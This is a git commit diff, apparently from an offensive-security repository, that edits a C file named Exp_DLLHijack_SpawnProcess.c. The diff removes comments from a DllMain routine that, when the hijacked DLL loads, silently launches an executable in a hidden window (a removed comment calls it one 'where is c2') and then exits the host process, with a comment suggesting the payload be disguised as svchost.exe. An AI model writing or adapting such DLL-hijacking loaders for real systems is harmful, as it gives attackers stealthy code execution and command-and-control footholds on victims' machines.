a1f99f97b1aaa907705950340f21bece48449669
d3hvck <106494573+d3hvck@users.noreply.github.com>
2025-03-15 03:24:58 +0400

    update

--- Exp_DLLHijack_SpawnProcess.c
+++ Exp_DLLHijack_SpawnProcess.c
@@ -23,28 +23,25 @@ BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
         // Better result use "C:\Windows\svchost.exe" original SVC Host located on System32 Folder
         LPCSTR command = "C:\\blabla.exe";
 
-        // Create a new process for any exe where is c2
         if (CreateProcess(
-                NULL,          // No module name (use command line)
-                (LPSTR)command, // Command line
-                NULL,          // Process handle not inheritable
-                NULL,          // Thread handle not inheritable
-                FALSE,         // No inheritance of handles
-                CREATE_NO_WINDOW, // Run in a hidden window
-                NULL,          // Use parent's environment block
-                NULL,          // Use parent's starting directory 
-                &si,           // Pointer to STARTUPINFO structure
-                &pi            // Pointer to PROCESS_INFORMATION structure
+                NULL,          
+                (LPSTR)command, 
+                NULL,          
+                NULL,          
+                FALSE,         
+                CREATE_NO_WINDOW, 
+                NULL,          
+                NULL,          
+                &si,           
+                &pi            
         )) {
-            // Close handles to the created process and its primary thread.
-            // Some frameworks might monitor process exits, so handle cleanup appropriately.
+
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
         } else {
-            // Error handling: GetLastError can provide details
+			
         }
 
-        // Terminate the DLL to prevent further processing
         ExitProcess(0);
     }
     return TRUE;
